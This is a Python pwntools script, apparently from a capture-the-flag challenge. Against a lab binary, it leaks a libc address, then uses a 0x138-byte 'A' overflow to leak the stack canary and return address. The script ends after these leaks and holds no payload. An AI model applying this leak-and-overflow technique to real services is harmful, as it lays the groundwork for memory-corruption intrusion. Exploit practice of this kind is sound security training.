#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './path/to/binary'

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 32146)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

size = 0x138
io = start()

def practice(msg):
    io.sendafter('>', '2')
    io.sendafter('>', msg)

def manual():
    io.sendafter('>', '1')

def filter_line(line):
    return line.replace('A', '').replace('-Tutorial-', '').strip()

def quit():
    io.sendafter('>', '3')

manual()
# I can't figure out for the moment what is at that address
# I will use some 64 binaries in order to help me
line = io.recvline().replace('Reference:', '').strip()
log.info("Some libc address: " + line)

practice('A' * size)
line = filter_line(io.recvline())
log.info("Stack cookie: " + hex(unpack(line[:8])))
log.info("Return address: " + hex(unpack(line[9:].ljust(8, '\x00'))))
